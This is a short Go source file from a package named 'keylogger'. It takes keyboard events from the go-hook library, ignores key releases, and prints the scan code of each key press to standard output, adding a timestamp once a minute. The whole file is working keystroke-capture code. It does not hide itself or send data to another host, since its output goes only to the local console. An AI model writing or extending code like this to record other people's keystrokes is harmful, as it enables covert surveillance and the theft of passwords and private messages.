package keylogger

import (
	"fmt"
	"time"

	"github.com/moutend/go-hook/pkg/types"
)

func ScanCodeLogger(keyboardChan chan types.KeyboardEvent) {
	var key types.KeyboardEvent

	var lastTime time.Time
	var now time.Time

	stdout := make(chan string)
	content := make(chan string)

	// Print stuff (stdout -> os.stdout)
	go func() {
		for {
			fmt.Print(<-stdout)
		}
	}()

	// Timestamp stuff before printing it (content -> stdout)
	go func() {
		piece := ""
		for {
			piece = <-content
			now = time.Now()
			if lastTime.Unix()/60 != now.Unix()/60 {
				lastTime = now.Truncate(time.Minute)
				stdout <- fmt.Sprintf("\n%s|", lastTime.Format(time.RFC3339)[:16])
			}
			stdout <- piece
			lastTime = now
		}
	}()

	// Listen to user
	for {
		key = <-keyboardChan

		// Ignore
		if key.Message == types.WM_KEYUP {
			continue
		}

		content <- fmt.Sprintf(" %d,", key.ScanCode)
	}
}
